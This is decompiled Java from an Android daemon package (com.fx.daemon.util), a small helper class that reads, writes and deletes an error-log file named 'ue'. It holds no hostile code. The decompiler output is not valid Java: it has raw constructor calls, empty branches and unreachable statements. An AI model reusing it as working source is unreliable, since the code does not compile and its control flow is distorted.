package com.fx.daemon.util;

import com.vvt.ak.a;
import com.vvt.io.p;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.Reader;

public class d
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  public static String a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    String str1 = null;
    Object localObject1 = "ue";
    Object localObject2;
    boolean bool3;
    BufferedReader localBufferedReader;
    try
    {
      localObject1 = p.a(paramString, (String)localObject1);
      boolean bool2 = a;
      if (bool2) {}
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      bool3 = ((File)localObject2).exists();
      if (bool3)
      {
        localBufferedReader = new java/io/BufferedReader;
        localObject1 = new java/io/FileReader;
        ((FileReader)localObject1).<init>((File)localObject2);
        localBufferedReader.<init>((Reader)localObject1);
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        bool3 = true;
        localObject1 = Boolean.valueOf(bool3);
        for (;;)
        {
          String str2 = localBufferedReader.readLine();
          if (str2 == null) {
            break;
          }
          boolean bool4 = ((Boolean)localObject1).booleanValue();
          if (bool4)
          {
            ((StringBuilder)localObject2).append(str2);
            bool3 = false;
            localObject1 = null;
            localObject1 = Boolean.valueOf(false);
          }
          else
          {
            Object localObject3 = "\n";
            localObject3 = ((StringBuilder)localObject2).append((String)localObject3);
            ((StringBuilder)localObject3).append(str2);
          }
        }
        bool3 = a;
      }
    }
    catch (Exception localException)
    {
      bool3 = b;
      if (!bool3) {}
    }
    for (;;)
    {
      if (bool3) {}
      return str1;
      localBufferedReader.close();
      str1 = ((StringBuilder)localObject2).toString();
      bool3 = a;
      if (bool3)
      {
        continue;
        bool3 = a;
        if (!bool3) {}
      }
    }
  }
  
  public static void a(String paramString, Throwable paramThrowable)
  {
    bool = a;
    if (bool) {}
    Object localObject1 = "ue";
    try
    {
      p.a(paramString, (String)localObject1);
      bool = a;
      if (bool) {}
      localObject1 = new java/io/File;
      Object localObject2 = "ue";
      ((File)localObject1).<init>(paramString, (String)localObject2);
      localObject2 = new java/io/BufferedWriter;
      FileWriter localFileWriter = new java/io/FileWriter;
      localFileWriter.<init>((File)localObject1);
      ((BufferedWriter)localObject2).<init>(localFileWriter);
      localObject1 = paramThrowable.toString();
      ((BufferedWriter)localObject2).write((String)localObject1);
      ((BufferedWriter)localObject2).close();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = a;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public static void b(String paramString)
  {
    File localFile = new java/io/File;
    localFile.<init>(paramString, "ue");
    localFile.delete();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/daemon/util/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */